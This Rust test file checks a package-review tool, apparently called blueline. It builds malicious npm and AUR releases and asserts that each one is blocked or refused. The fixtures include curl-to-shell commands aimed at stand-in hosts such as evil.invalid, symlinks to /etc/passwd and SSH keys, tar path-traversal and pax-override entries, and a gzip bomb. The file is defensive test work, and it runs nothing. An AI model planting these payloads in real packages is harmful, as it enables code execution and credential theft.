//! Reproducible attack scenarios: `cargo test --test scenarios` is an audit
//! of the threat model, one `#[test]` per attack.
//!
//! Each scenario stands up a known-bad release through the shared harness
//! (`support`), runs the real `blueline` binary against it, and asserts the
//! band, the rule id, or the refusal. Nothing is ever executed and nothing
//! leaves loopback.
//!
//! Naming convention: `<attack>_is_<expected outcome>`, so a failure names
//! the property that broke rather than the code that broke.
//!
//! `scripts/scenarios/run.sh <name>` runs one scenario and prints the verdict
//! it observed.

mod support;

use support::{
    AurRegistry, AurRevision, Band, Cli, EXIT_BLOCKED, EXIT_ERROR, Entry, Probe, RecallService,
    Registry, ReleaseBuilder, gzip, pad_to_512, pax_record, raw_header, sha512_sri,
};

// ---------------------------------------------------------------------------
// npm: install-time code injection
// ---------------------------------------------------------------------------

/// A release that adds a `postinstall` script over its own clean baseline is
/// install-time code execution by construction. The band must be BLOCK and
/// the rule must name the script, so a reviewer sees what runs and when.
#[test]
fn postinstall_script_added_to_a_release_is_blocked() {
    let clean = ReleaseBuilder::npm("payload", "1.0.0")
        .file("package/lib/index.js", b"module.exports = 1;\n")
        .build();
    let backdoored = ReleaseBuilder::npm("payload", "1.1.0")
        .file("package/lib/index.js", b"module.exports = 1;\n")
        .file(
            "package/setup.js",
            b"require('child_process').execSync('curl http://evil.invalid|sh');\n",
        )
        .script("postinstall", "node setup.js")
        .build();

    let registry = Registry::serve(vec![clean, backdoored]);
    let run = Cli::npm(registry.base()).review("payload@1.1.0");

    run.assert_blocked();
    let verdict = run.verdict();
    assert_eq!(
        verdict.band(),
        Band::Block,
        "a new postinstall is a hard policy violation: {}",
        verdict.raw()
    );
    assert_eq!(
        verdict.field("baseline_version"),
        "1.0.0",
        "the delta must be judged against the previous release: {}",
        verdict.raw()
    );
    let finding = verdict.finding("R01_LIFECYCLE_SCRIPT_ADDED");
    assert!(
        finding["description"]
            .as_str()
            .unwrap_or_default()
            .contains("postinstall"),
        "the finding must name the script that runs at install time: {finding}"
    );
    assert!(
        registry.requested("payload-1.1.0.tgz"),
        "the release under review must actually have been fetched: {:?}",
        registry.requests()
    );
}

/// A release whose `postinstall` installs *another* package moves the attack
/// one hop out. The parent's own bytes look clean, so a review that stopped at
/// the top-level diff would call it LOW. The engine must follow the reference,
/// review the child, and surface it as a child verdict — the whole point of the
/// `recursive` field (ARCHITECTURE R24/R27).
#[test]
fn install_time_dependency_reach_is_reviewed_as_a_child_verdict() {
    let clean_child = ReleaseBuilder::npm("helper", "1.0.0")
        .file("package/lib/index.js", b"module.exports = 1;\n")
        .build();
    // The child is itself malicious: it adds its own postinstall.
    let bad_child = ReleaseBuilder::npm("helper", "1.1.0")
        .file("package/lib/index.js", b"module.exports = 1;\n")
        .file("package/setup.js", b"console.log('pwned');\n")
        .script("postinstall", "node setup.js")
        .build();
    // The parent's payload reaches the child. The reference is an exact
    // version on purpose: an unpinned range (`helper@latest`) cannot be
    // resolved for review and is disclosed as such, which is a different
    // property — pinned here so the scenario measures recursion, not pinning.
    let parent = ReleaseBuilder::npm("reach", "1.0.0")
        .file("package/lib/index.js", b"module.exports = 1;\n")
        .script("postinstall", "npm install helper@1.1.0")
        .build();

    let registry = Registry::serve(vec![clean_child, bad_child, parent]);
    let run = Cli::npm(registry.base()).review("reach@1.0.0");
    let verdict = run.verdict();

    assert!(
        verdict.has_rule("R24_LIFECYCLE_INSTALL_REF"),
        "an install-time reference must be disclosed as a finding: {:?}",
        verdict.rule_ids()
    );
    let children = verdict.children();
    assert!(
        !children.is_empty(),
        "the engine must review what the install script reaches, not stop at the parent: {}",
        verdict.raw()
    );
    assert!(
        children
            .iter()
            .any(|child| child.field("name") == "helper" && child.band() != Band::Low),
        "the malicious child must be held at its own band: {}",
        verdict.raw()
    );
}

/// A new runtime dependency is transitive risk the parent alone cannot show.
/// The engine must disclose it and must not score the release LOW.
#[test]
fn dependency_added_by_a_release_is_disclosed_and_bands_above_low() {
    let clean = ReleaseBuilder::npm("deps", "1.0.0")
        .file("package/lib/index.js", b"module.exports = 1;\n")
        .build();
    let widened = ReleaseBuilder::npm("deps", "1.1.0")
        .file("package/lib/index.js", b"module.exports = 1;\n")
        .dependency("left-pad", "^1.3.0")
        .build();

    let registry = Registry::serve(vec![clean, widened]);
    let run = Cli::npm(registry.base()).review("deps@1.1.0");
    let verdict = run.verdict();

    assert!(
        verdict.has_rule("R04_DEPENDENCY_ADDED"),
        "a new dependency must be disclosed: {:?}",
        verdict.rule_ids()
    );
    assert_ne!(
        verdict.band(),
        Band::Low,
        "a release that widened its dependency surface is not LOW: {}",
        verdict.raw()
    );
}

/// A revocation is the strongest signal the engine has, and it must dominate
/// whatever else the release looks like. Served from the local recall index so
/// the scenario stays offline: sync a snapshot naming the release, then review
/// it. ARCHITECTURE: a recall hit BLOCKs *before* the `check_advisories`
/// switch — disabling OSV must never silence it.
#[test]
fn recall_revoked_release_is_blocked_by_the_curated_index() {
    let snapshot = serde_json::json!({
        "schema": 1,
        "generated_at": unix_now(),
        "sequence": 9,
        "revocations": [{
            "ecosystem": "npm",
            "name": "wormed",
            "versions": ["1.0.0"],
            "all_versions": false,
            "reason": "backdoored postinstall, human-verified",
            "id": "BL-SCENARIO-0042"
        }]
    })
    .to_string();
    let work = tempfile::tempdir().expect("create recall fixture dir");
    let path = work.path().join("index.json");
    std::fs::write(&path, snapshot).expect("write recall snapshot");
    let service = RecallService::serve(&path);

    let cli = Cli::without_registry();
    assert_eq!(
        cli.recall_sync(service.url()).code(),
        Some(0),
        "the recall snapshot must sync before it can be trusted"
    );

    // The release looks entirely clean: no scripts, no new dependencies.
    let wormed = ReleaseBuilder::npm("wormed", "1.0.0")
        .file("package/lib/index.js", b"module.exports = 1;\n")
        .build();
    let registry = Registry::serve(vec![wormed]);

    // The review must see the snapshot that was just synced, so it reuses
    // that engine state rather than starting from a clean data directory.
    let run = cli.at("npm", registry.base()).review("wormed@1.0.0");
    let verdict = run.verdict();

    assert_eq!(
        verdict.band(),
        Band::Block,
        "a human-verified revocation must BLOCK regardless of how clean the diff is: {}",
        verdict.raw()
    );
    assert!(
        verdict.has_rule("R09_ADVISORY_MALWARE"),
        "the revocation must roll up as malware: {:?}",
        verdict.rule_ids()
    );
    assert_eq!(run.code(), Some(EXIT_BLOCKED), "{run}");
}

/// The agent lane must reach the same band as `review` — a hook cannot be
/// weaker than the desk — and exit 0 only for a LOW release.
#[test]
fn agent_lane_holds_a_postinstall_release_with_exit_2() {
    let backdoored = ReleaseBuilder::npm("payload", "1.0.0")
        .script("postinstall", "node setup.js")
        .file("package/setup.js", b"console.log(1);\n")
        .build();
    let registry = Registry::serve(vec![backdoored]);

    let run = Cli::npm(registry.base()).agent_review("payload@1.0.0");
    assert_eq!(
        run.code(),
        Some(EXIT_BLOCKED),
        "agent review must exit 2 on a held release:\n{run}"
    );
    let verdict = run.verdict();
    assert_eq!(verdict.band(), Band::Block, "{}", verdict.raw());
    assert!(
        verdict.has_rule("R01_LIFECYCLE_SCRIPT_ADDED"),
        "the agent verdict must carry the rule, not just a band: {}",
        verdict.raw()
    );
}

// ---------------------------------------------------------------------------
// npm: the gate is fail-closed on a release it cannot review
// ---------------------------------------------------------------------------

/// A gate that allowed anything it failed to review would be a silent bypass:
/// an attacker who can make the review error gets the install through. The
/// gate must deny and say it could not review.
#[test]
fn install_gate_denies_a_release_whose_review_cannot_complete() {
    let hostile = ReleaseBuilder::npm("hostile", "1.0.0")
        .file("package/package.json", b"{}")
        .entry(Entry::symlink("package/escape", "/etc/passwd"))
        .build();
    let registry = Registry::serve(vec![hostile]);

    let run = Cli::npm(registry.base()).gate("npm install hostile@1.0.0");
    assert_eq!(
        run.code(),
        Some(EXIT_BLOCKED),
        "an unreviewable release must be denied, not waved through:\n{run}"
    );
    assert!(
        run.has_stderr("hostile@1.0.0"),
        "the denial must name the refused spec:\n{run}"
    );
    assert!(
        run.has_stderr("review failed"),
        "the denial must disclose that the review itself failed:\n{run}"
    );
}

// ---------------------------------------------------------------------------
// Archive-level escapes: all must be refused before anything is written
// ---------------------------------------------------------------------------

/// An absolute path in the archive is a write primitive the moment the
/// extractor honors it. It must be refused, and nothing may appear at the
/// path the archive named.
#[test]
fn tar_absolute_path_entry_is_refused_and_writes_nothing() {
    let probe = Probe::new();
    let sentinel = probe.sentinel("cron.d-payload");
    let hostile = ReleaseBuilder::npm("escapes", "1.0.0")
        .entry(Entry::file(
            &format!("{}/cron.d-payload", probe.path().display()),
            b"* * * * * root curl http://evil.invalid|sh\n",
        ))
        .build();
    let registry = Registry::serve(vec![hostile]);

    let run = Cli::npm(registry.base()).review("escapes@1.0.0");
    run.assert_refused("absolute entry path");
    assert!(
        !sentinel.exists(),
        "an absolute entry path wrote {} — the archive escaped its sandbox",
        sentinel.display()
    );
    probe.assert_untouched();
}

/// `..` in an entry path walks out of the extraction root. The entry below
/// names a real directory the harness owns, so "the archive escaped" is a
/// checkable fact rather than a claim.
#[test]
fn tar_parent_traversal_entry_is_refused_and_writes_nothing() {
    let probe = Probe::new();
    let probe_name = probe
        .path()
        .file_name()
        .expect("probe dir has a name")
        .to_string_lossy()
        .into_owned();
    let hostile = ReleaseBuilder::npm("escapes", "1.0.0")
        .entry(Entry::file(
            &format!("package/../../{probe_name}/stolen"),
            b"exfiltrated\n",
        ))
        .build();
    let registry = Registry::serve(vec![hostile]);

    let run = Cli::npm(registry.base()).review("escapes@1.0.0");
    run.assert_refused("traversal");
    probe.assert_untouched();
}

/// A symlink entry can name a target outside the root without any `..` in a
/// path, so it must be rejected on its type alone.
#[test]
fn tar_symlink_escape_entry_is_refused() {
    let hostile = ReleaseBuilder::npm("escapes", "1.0.0")
        .entry(Entry::symlink("package/id_rsa", "/root/.ssh/id_rsa"))
        .build();
    let registry = Registry::serve(vec![hostile]);

    let run = Cli::npm(registry.base()).review("escapes@1.0.0");
    run.assert_refused("unsupported entry type");
}

/// Same for hardlinks: a hardlink entry turns an in-archive file into a write
/// at an arbitrary name, which is the other half of the same escape.
#[test]
fn tar_hardlink_escape_entry_is_refused() {
    let hostile = ReleaseBuilder::npm("escapes", "1.0.0")
        .file("package/seed", b"seed\n")
        .entry(Entry::hardlink("package/authorized_keys", "package/seed"))
        .build();
    let registry = Registry::serve(vec![hostile]);

    let run = Cli::npm(registry.base()).review("escapes@1.0.0");
    run.assert_refused("unsupported entry type");
}

// ---------------------------------------------------------------------------
// Decompression bomb
// ---------------------------------------------------------------------------

/// A small download that unpacks to far more than the per-entry cap must be
/// refused on its declared size, before the bytes land. The fixture really
/// does carry the payload (it is not a header lie), and the served tarball is
/// asserted to be small — that is what makes it a bomb rather than a big file.
#[test]
fn gzip_bomb_entry_over_the_per_entry_cap_is_refused() {
    const PAYLOAD: u64 = 200 * 1024 * 1024;
    let bomb = ReleaseBuilder::npm("bomb", "1.0.0")
        .entry(Entry::zeroes("package/bomb.bin", PAYLOAD))
        .build();
    assert!(
        bomb.tarball().len() < 1024 * 1024,
        "the bomb must arrive small ({} bytes); a large download is a different guard",
        bomb.tarball().len()
    );
    let registry = Registry::serve(vec![bomb]);

    let run = Cli::npm(registry.base()).review("bomb@1.0.0");
    run.assert_refused("exceeding per-entry cap");
    assert!(
        !registry.peers().is_empty(),
        "the bomb must have been fetched before the guard fired"
    );
}

// ---------------------------------------------------------------------------
// Integrity
// ---------------------------------------------------------------------------

/// The classic swap: the registry advertises the digest of a harmless
/// tarball and serves different bytes. Verification happens before extraction,
/// so the run must refuse with no verdict at all — and the hostile bytes must
/// demonstrably have been fetched, proving the refusal was verification and
/// not a fetch failure.
#[test]
fn tampered_tarball_is_refused_on_integrity_before_any_verdict() {
    let advertised = ReleaseBuilder::npm("swap", "1.0.0").build();
    let tampered = ReleaseBuilder::npm("swap", "1.0.0")
        .script("postinstall", "node steal.js")
        .file("package/steal.js", b"console.log('swapped');\n")
        .advertise_digest_of(advertised.tarball())
        .build();
    assert_eq!(
        advertised.integrity(),
        tampered.integrity(),
        "the fixture must advertise the harmless digest"
    );

    let registry = Registry::serve(vec![tampered]);
    let run = Cli::npm(registry.base()).review("swap@1.0.0");
    run.assert_refused("sha512 mismatch");
    assert!(
        registry.requested("swap-1.0.0.tgz"),
        "the tampered bytes must have been fetched (and hashed): {:?}",
        registry.requests()
    );
}

/// An archive whose entry count exceeds the cap is refused rather than walked.
/// The entries themselves are innocuous one-byte files, so nothing but the
/// count makes this an attack.
#[test]
fn tar_entry_count_over_the_cap_is_refused() {
    let mut hostile = ReleaseBuilder::npm("manyfiles", "1.0.0");
    for i in 0..100_001 {
        hostile = hostile.entry(Entry::file(&format!("package/f{i:06}.txt"), b"x"));
    }
    let registry = Registry::serve(vec![hostile.build()]);

    let run = Cli::npm(registry.base()).review("manyfiles@1.0.0");
    run.assert_refused("entry count exceeded");
}

/// GNU long names (`typeflag L`) carry a path in the stream that the ustar
/// header cannot hold. That is the same escape primitive as a long header
/// path, reached through a different field.
#[test]
fn gnu_longname_absolute_path_entry_is_refused_and_writes_nothing() {
    let probe = Probe::new();
    let long = format!("{}\npwned\n", probe.sentinel("longname-pwned").display());
    let mut tar: Vec<u8> = Vec::new();
    tar.extend_from_slice(&raw_header("././@LongLink", b'L', long.len() as u64, ""));
    tar.extend_from_slice(long.as_bytes());
    tar.extend_from_slice(&pad_to_512(long.len()));
    tar.extend_from_slice(&raw_header("short", b'0', 2, ""));
    tar.extend_from_slice(b"hi");
    tar.extend_from_slice(&[0u8; 510]);
    tar.extend_from_slice(&[0u8; 1024]);

    let registry = Registry::serve(vec![
        ReleaseBuilder::for_bytes("longname", "1.0.0", gzip(&tar), sha512_sri(&gzip(&tar))).build(),
    ]);

    let run = Cli::npm(registry.base()).review("longname@1.0.0");
    run.assert_refused("absolute entry path");
    probe.assert_untouched();
}

/// A pax extended header can rewrite the *path* of the entry that follows it,
/// so the header says `innocent` and the payload writes wherever `path=` says.
/// The override must be validated like any other entry path.
#[test]
fn pax_header_absolute_path_override_is_refused_and_writes_nothing() {
    let probe = Probe::new();
    let target = probe.sentinel("pax-pwned");
    let mut tar: Vec<u8> = Vec::new();
    let body = pax_record("path", &target.display().to_string());
    tar.extend_from_slice(&raw_header("PaxHeaders/p", b'x', body.len() as u64, ""));
    tar.extend_from_slice(body.as_bytes());
    tar.extend_from_slice(&pad_to_512(body.len()));
    tar.extend_from_slice(&raw_header("innocent", b'0', 6, ""));
    tar.extend_from_slice(b"pwned\n");
    tar.extend_from_slice(&pad_to_512(6));
    tar.extend_from_slice(&[0u8; 1024]);

    let gzipped = gzip(&tar);
    let registry = Registry::serve(vec![
        ReleaseBuilder::for_bytes("paxabs", "1.0.0", gzipped.clone(), sha512_sri(&gzipped)).build(),
    ]);

    let run = Cli::npm(registry.base()).review("paxabs@1.0.0");
    run.assert_refused("absolute entry path");
    assert!(
        !target.exists(),
        "a pax path override wrote {} — the archive escaped its sandbox",
        target.display()
    );
    probe.assert_untouched();
}

/// A pax `linkpath` override is the symlink primitive by another route: the
/// entry can be a plain file header whose *link* target comes from pax.
#[test]
fn gnu_longlink_absolute_target_is_refused() {
    let target = "/etc/passwd\n";
    let mut tar: Vec<u8> = Vec::new();
    tar.extend_from_slice(&raw_header("././@LongLink", b'K', target.len() as u64, ""));
    tar.extend_from_slice(target.as_bytes());
    tar.extend_from_slice(&pad_to_512(target.len()));
    tar.extend_from_slice(&raw_header("package/link", b'2', 0, ""));
    tar.extend_from_slice(&[0u8; 1024]);

    let gzipped = gzip(&tar);
    let registry = Registry::serve(vec![
        ReleaseBuilder::for_bytes("longlink", "1.0.0", gzipped.clone(), sha512_sri(&gzipped))
            .build(),
    ]);

    let run = Cli::npm(registry.base()).review("longlink@1.0.0");
    run.assert_refused("unsupported entry type");
}

/// A release that publishes no integrity is refused: unverifiable bytes must
/// not reach extraction on the registry's say-so alone.
#[test]
fn release_published_without_integrity_is_refused() {
    let unverifiable = ReleaseBuilder::npm("unverified", "1.0.0")
        .publish_without_integrity()
        .build();
    let registry = Registry::serve(vec![unverifiable]);

    let run = Cli::npm(registry.base()).review("unverified@1.0.0");
    run.assert_refused("no dist.integrity");
}

// ---------------------------------------------------------------------------
// AUR: the PKGBUILD is code, and it is never run
// ---------------------------------------------------------------------------

/// A PKGBUILD that pipes a fetched script into a shell, on top of a baseline
/// release whose source was pinned and whose build step was `make`. The
/// review must read both commits statically, disclose the pipe, and refuse to
/// auto-approve.
#[test]
fn pkgbuild_curl_pipe_to_shell_release_is_disclosed_and_refused() {
    let pinned = AurRevision::new(
        "aur-scenario",
        "1.0",
        r#"pkgname=aur-scenario
pkgver=1.0
pkgrel=1
arch=('x86_64')
source=('https://example.invalid/aur-scenario-1.0.tar.gz')
sha256sums=('1111111111111111111111111111111111111111111111111111111111111111')
build() {
  make
}
"#,
    );
    let piped = AurRevision::new(
        "aur-scenario",
        "1.1",
        r#"pkgname=aur-scenario
pkgver=1.1
pkgrel=1
arch=('x86_64')
source=('https://example.invalid/aur-scenario-1.1.tar.gz')
sha256sums=('SKIP')
build() {
  curl -fsSL https://example.invalid/install.sh | bash
}
"#,
    );
    let aur = AurRegistry::serve("aur-scenario", &[pinned, piped]);

    let run = Cli::aur(aur.base()).review("aur-scenario@1.1-1");
    assert_ne!(
        run.code(),
        Some(0),
        "a curl-pipe PKGBUILD must never auto-approve:\n{run}"
    );
    let verdict = run.verdict();
    assert!(
        verdict.has_rule("R13_PIPE_TO_SHELL"),
        "the pipe-to-shell delivery must be disclosed: {:?}",
        verdict.rule_ids()
    );
    assert_ne!(
        verdict.band(),
        Band::Low,
        "the band must reflect the finding: {}",
        verdict.raw()
    );
    assert!(
        aur.non_loopback_peers().is_empty(),
        "the AUR fixture must stay on loopback"
    );
}

// ---------------------------------------------------------------------------
// Recall index: monotonic sync
// ---------------------------------------------------------------------------

/// A replayed snapshot — an older `sequence` served by a service that has
/// been rolled back, or MITM'd to one — must be refused *without writing*.
/// A partially written snapshot would silently drop revocations.
#[test]
fn recall_index_backward_sequence_replay_is_refused_without_writing() {
    let work = tempfile::tempdir().expect("create recall fixture dir");
    let current = work.path().join("current.json");
    let rolled_back = work.path().join("rolled_back.json");
    std::fs::write(&current, recall_snapshot(42)).expect("write current snapshot");
    std::fs::write(&rolled_back, recall_snapshot(41)).expect("write rolled-back snapshot");

    let current_service = RecallService::serve(&current);
    let cli = Cli::without_registry();
    let stored = cli.data_path("recall_snapshot.json");
    let synced = cli.recall_sync(current_service.url());
    assert_eq!(
        synced.code(),
        Some(0),
        "the first sync must succeed:\n{synced}"
    );
    let before = std::fs::read(&stored).expect("read stored snapshot");

    let rolled_back_service = RecallService::serve(&rolled_back);
    let replayed = cli.recall_sync(rolled_back_service.url());
    assert_eq!(
        replayed.code(),
        Some(EXIT_ERROR),
        "a backward sequence must be refused:\n{replayed}"
    );
    assert!(
        replayed.has_stderr("sequence"),
        "the refusal must name sequence monotonicity:\n{replayed}"
    );
    assert_eq!(
        std::fs::read(&stored).expect("reread stored snapshot"),
        before,
        "a refused sync must not write the snapshot"
    );

    let document: serde_json::Value =
        serde_json::from_slice(&before).expect("stored snapshot is JSON");
    assert_eq!(document["snapshot"]["sequence"], 42);
}

/// Same `sequence`: a re-sync is idempotent, not a rollback. If it were
/// treated as a rollback, an operator could never refresh a snapshot that
/// only re-published the same sequence.
#[test]
fn recall_index_equal_sequence_resync_is_idempotent() {
    let work = tempfile::tempdir().expect("create recall fixture dir");
    let snapshot = work.path().join("snapshot.json");
    std::fs::write(&snapshot, recall_snapshot(7)).expect("write snapshot");
    let service = RecallService::serve(&snapshot);

    let cli = Cli::without_registry();
    assert_eq!(cli.recall_sync(service.url()).code(), Some(0), "first sync");
    let stored = cli.data_path("recall_snapshot.json");
    let before = std::fs::read(&stored).expect("read stored snapshot");

    let again = cli.recall_sync(service.url());
    assert_eq!(
        again.code(),
        Some(0),
        "an equal sequence is not a rollback:\n{again}"
    );
    let after = std::fs::read(&stored).expect("reread stored snapshot");
    let document: serde_json::Value =
        serde_json::from_slice(&after).expect("stored snapshot is JSON");
    assert_eq!(document["snapshot"]["sequence"], 7);
    assert_eq!(after.len(), before.len(), "re-sync is idempotent");
}

fn recall_snapshot(sequence: i64) -> String {
    serde_json::json!({
        "schema": 1,
        "generated_at": unix_now(),
        "sequence": sequence,
        "revocations": [{
            "ecosystem": "npm",
            "name": "wormed",
            "versions": ["1.0.0"],
            "all_versions": false,
            "reason": "scenario fixture",
            "id": "BL-SCENARIO-0001"
        }]
    })
    .to_string()
}

fn unix_now() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .expect("clock is after the epoch")
        .as_secs() as i64
}

// ---------------------------------------------------------------------------
// Shim: the install must not run when the gate cannot
// ---------------------------------------------------------------------------

/// The shim is the backstop for the interactive terminal. If the blueline
/// binary it baked in is gone — deleted, half-installed PATH, wrong container
/// — the real package manager must not run. `shim install` bakes
/// `current_exe()`, so the scenario installs through a *copy* of the binary
/// and then removes the copy.
#[test]
fn shim_fails_closed_when_the_baked_blueline_binary_is_missing() {
    let work = tempfile::tempdir().expect("create shim fixture dir");
    let bin_dir = work.path().join("blueline-bin");
    std::fs::create_dir_all(&bin_dir).expect("create fake bin dir");
    let blueline_copy = bin_dir.join("blueline");
    std::fs::copy(env!("CARGO_BIN_EXE_blueline"), &blueline_copy)
        .expect("copy blueline binary into the fixture");
    make_executable(&blueline_copy);

    // A stand-in for the real package manager that records every invocation.
    let npm_dir = work.path().join("npm-bin");
    std::fs::create_dir_all(&npm_dir).expect("create fake npm dir");
    let npm_log = work.path().join("npm-invocations.log");
    let fake_npm = npm_dir.join("npm");
    std::fs::write(
        &fake_npm,
        format!(
            "#!/bin/sh\nprintf '%s\\n' \"$@\" >> {}\nexit 0\n",
            npm_log.display()
        ),
    )
    .expect("write fake npm");
    make_executable(&fake_npm);

    let shim_dir = work.path().join("shims");
    let path = format!(
        "{}:{}",
        npm_dir.display(),
        std::env::var("PATH").unwrap_or_default()
    );
    let install = std::process::Command::new(&blueline_copy)
        .args(["shim", "install", "npm", "--dir"])
        .arg(&shim_dir)
        .env("BLUELINE_DATA_DIR", work.path())
        .env("PATH", &path)
        .output()
        .expect("run shim install");
    assert!(
        install.status.success(),
        "shim install failed: {}",
        String::from_utf8_lossy(&install.stderr)
    );

    let shim = shim_dir.join("npm");
    assert!(shim.is_file(), "the npm shim must exist");
    let script = std::fs::read_to_string(&shim).expect("read the shim script");
    assert!(
        script.contains(&blueline_copy.display().to_string()),
        "the shim must bake the binary it was installed from:\n{script}"
    );

    std::fs::remove_file(&blueline_copy).expect("remove the baked binary");

    let run = std::process::Command::new(&shim)
        .args(["install", "anything@1.0.0"])
        .env("PATH", &path)
        .env("BLUELINE_DATA_DIR", work.path())
        .output()
        .expect("run the npm shim");
    let stderr = String::from_utf8_lossy(&run.stderr).to_string();
    assert!(
        !run.status.success(),
        "the shim must fail closed with no gate:\n{stderr}"
    );
    assert!(
        stderr.contains("blocked by review policy"),
        "the shim must refuse in its own words:\n{stderr}"
    );
    assert!(
        !npm_log.exists(),
        "the real package manager ran without a gate — that is the bypass"
    );
}

#[cfg(unix)]
fn make_executable(path: &std::path::Path) {
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755))
        .unwrap_or_else(|e| panic!("chmod {}: {e}", path.display()));
}

#[cfg(not(unix))]
fn make_executable(_path: &std::path::Path) {}

// ---------------------------------------------------------------------------
// Hermeticity
// ---------------------------------------------------------------------------

/// The harness is only trustworthy if it cannot reach the network. Three
/// independent checks: the listener is loopback, every peer that connected is
/// loopback, and the harness source names no routable endpoint.
#[test]
fn scenario_harness_never_opens_a_non_loopback_socket() {
    let registry = Registry::serve(vec![ReleaseBuilder::npm("hermetic", "1.0.0").build()]);
    assert!(
        registry.addr().ip().is_loopback(),
        "the fixture registry bound {}",
        registry.addr()
    );

    let run = Cli::npm(registry.base())
        .allow_unreviewed_baseline("hermetic")
        .review("hermetic@1.0.0");
    assert_ne!(
        run.code(),
        Some(EXIT_ERROR),
        "the hermeticity probe must reach the engine, not fail before it:\n{run}"
    );
    assert!(
        registry.requested("hermetic"),
        "the scenario must have spoken to the loopback fixture: {:?}",
        registry.requests()
    );
    assert!(
        !registry.peers().is_empty(),
        "the engine must actually have connected"
    );
    assert!(
        registry.non_loopback_peers().is_empty(),
        "a non-loopback peer reached the fixture registry: {:?}",
        registry.peers()
    );

    for (file, source) in HARNESS_SOURCES {
        for routable in ROUTABLE_LITERALS {
            assert!(
                !source.contains(routable),
                "{file} names the routable endpoint `{routable}`; fixtures must be loopback-only"
            );
        }
    }
}

/// Harness sources and the literals that would make a fixture non-hermetic.
const HARNESS_SOURCES: &[(&str, &str)] = &[
    ("support/mod.rs", include_str!("support/mod.rs")),
    ("support/tarball.rs", include_str!("support/tarball.rs")),
    ("support/registry.rs", include_str!("support/registry.rs")),
    ("support/aur.rs", include_str!("support/aur.rs")),
    ("support/cli.rs", include_str!("support/cli.rs")),
];

const ROUTABLE_LITERALS: &[&str] = &[
    "0.0.0.0",
    "registry.npmjs.org",
    "index.crates.io",
    "pypi.org",
    "aur.archlinux.org",
    "osv.dev",
    "https://",
];
